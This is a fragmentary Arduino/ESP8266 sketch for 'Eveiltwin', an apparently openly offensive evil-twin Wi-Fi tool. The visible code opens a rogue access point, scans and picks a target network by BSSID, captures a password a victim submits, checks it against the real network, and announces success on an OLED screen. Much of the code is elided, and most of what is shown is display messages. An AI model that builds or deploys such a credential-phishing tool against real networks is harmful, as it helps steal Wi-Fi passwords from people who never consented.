...
/* AP SSID & Password */
const char AP_SSID[] = "Eveil";
const char AP_PASS[] = "123456";
...
const unsigned char EveilBoot [] PROGMEM = {
...
const unsigned char EveilIcon [] PROGMEM = {
...
void setup() {
  ...
  */
  ...
  display.drawBitmap(0, 0, EveilBoot, 128, 64, WHITE); 
  display.setCursor(65, 20);  display.println("./Eveil");
  ...
  display.setTextSize(1);             
  display.setTextColor(WHITE);        
  display.setCursor(0, 10);  display.println("[*] Starting Eveiltwin git/bhuwan-5054");
  delay(2000);
  display.display();
  ...
  webServer.begin();
  display.setCursor(0,45);  display.println("[*] Successfully started Eveiltwin");
  delay(2000);
  display.display();
  display.setCursor(0, 52);  display.println(">> I think you know what you're doing");
  delay(5000);
  display.display();
  display.setCursor(0,59);  display.println(">> Good Luck,  >_< <<");
  delay(2000);
  display.display();
}
void performScan() {
...
void handleResult() {
  ...
  if (WiFi.status() != WL_CONNECTED) {
    ...
    _correct = "Password for " + _selectedNetwork.ssid + "<br> Result: " + _tryPassword;
        ...
        display.setCursor(0, 38);  
        display.println("[+] Yahh ! Password is true");
        delay(2000);
        display.display();
        ...
        display.println("[*] ./Eveil (github.com/bhuwan-5054)");
        delay(1000);
        display.display();

    Serial.println("Yahh! Password is true");
  ...
  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap") ) {
        ...
        /* OLED */
          display.clearDisplay();
          display.drawBitmap(0, 0, EveilIcon, 128, 64, WHITE); 
          delay(5000);
          display.display(); 
          display.setCursor(65, 14);  display.println("[*] Select target");
          delay(2000);
          display.display();
